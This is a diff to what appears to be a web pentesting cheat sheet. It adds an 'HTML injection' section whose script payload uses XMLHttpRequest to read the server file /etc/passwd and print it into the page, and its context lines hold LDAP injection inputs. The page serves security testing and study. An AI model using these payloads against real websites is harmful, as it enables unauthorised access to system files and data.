@@ -223,6 +223,25 @@ aa*                  #Sometimes helps to show more registers. Remember to check 
 USER)(description=a* #Check if the first letter of description field starts with a. Useful for blind LDAP injection. It may fail if the char "*" is present
 </code></pre>
                     </ul>
+
+                    <h2 id="HTML injection">HTML injection</h2>
+                    <ul>
+                        <p>In case we found that a website let's you write text that then is being displayed somewhere attempt to introduce HTML tags and check if they are being rendered. </p>
+                        <h3>XMLHttpRequest</h3>
+                        <ul>
+                            <p>We can try with some payload of XMLHttpRequest objects and attempt to read server's local files</p>
+                            <pre><code class="language-js">&lt;script&gt;
+x=new XMLHttpRequest;
+x.onload=function(){  
+document.write(this.responseText)};
+x.open("GET","file:///etc/passwd");
+x.send();
+&lt;/script&gt;</code></pre>
+                            <p>This is also related with XSS and XML Injection take a look below</p>
+                        </ul>    
+                        
+                    </ul>
+
                         <h2 id="XSS: Cross Site Scripting">XSS: Cross Site Scripting</h2>
                         <ul>
                             <p>Remember to try all diferent inputs to detect XSS</p>
